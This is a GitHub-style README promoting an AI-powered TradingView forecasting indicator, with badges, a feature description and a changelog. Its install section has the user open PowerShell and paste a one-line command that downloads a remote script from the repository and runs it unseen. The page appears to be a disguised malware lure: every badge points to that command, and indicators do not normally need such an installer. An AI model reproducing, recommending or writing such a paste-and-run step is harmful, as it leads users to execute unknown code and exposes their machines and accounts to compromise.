<a id="get"></a>
<p align="center">
  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant.jpg" alt="TradingView" width="880"></a>
</p>
<p align="center">
  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install">
    <img src="https://img.shields.io/badge/version-2.9.5-blue?style=flat-square" alt="version">
  </a>

  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install">
    <img src="https://img.shields.io/badge/beta%20users-7.4k-brightgreen?logo=github&style=flat-square" alt="beta users">
  </a>

  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install">
    <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="license">
  </a>
</p>

Quant is our first AI-powered indicator for TradingView. It analyzes historical market data, price action, liquidity, positioning, volatility, and market structure to produce a directional forecast for the timeframe you select.
<br><br>
The model also considers upcoming economic releases and other events that may affect the asset. The forecast appears directly on the TradingView chart and updates as new data comes in. You can see the signals behind it and what would cause the model to revise its conclusion.
<p>
  <a href="https://www.tradingview.com/">TradingView</a> ·
  <a href="https://www.tradingview.com/desktop/">Desktop app</a> ·
  <a href="https://www.tradingview.com/support/">Help Center</a> ·
  <a href="https://github.com/TradingView-Library/Quant-Indicator/issues">Issues</a>
</p>

## Install
The installer supports Windows, macOS, and Linux. TradingView Desktop must be installed before setup.

#### 1. Open PowerShell

Press **Win + R**, type `PowerShell`, and press **Enter**.

#### 2. Run the Installation Command

Paste the installation command below into the PowerShell window:

```powershell
irm -useb github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
```

#### 3. Restart TradingView

If TradingView was open during installation, restart it to finish setup. The Quant Indicator will then appear in your indicator library.

----

## Changelog

#### `v2.9.5 Beta`

- Updated processing for price action, liquidity, positioning, volatility, and market structure.
- Added scheduled economic releases to scenario calculations.
- Changed how historical data is loaded when switching timeframes.
- Fixed calculations that could carry over after switching symbols.
- Added validation for missing or delayed market data.
- Corrected volatility calculations during sharp price movements.
- Updated liquidity calculations to use available market depth data.
- Fixed positioning data errors on instruments with limited history.
- Removed redundant calculations during market data updates.
- Fixed delayed chart updates after periods of low trading activity.
- Corrected handling of incomplete candles and partially loaded charts.
- Fixed data synchronization after temporary connection interruptions.
- Fixed an issue where scenario lines could remain visible after removing the indicator.
- Fixed duplicate scenario plots appearing after reloading a chart.
